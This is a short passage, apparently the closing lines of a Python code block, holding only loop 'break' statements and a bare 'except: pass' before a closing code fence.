                break
        break
    except:
        pass
```

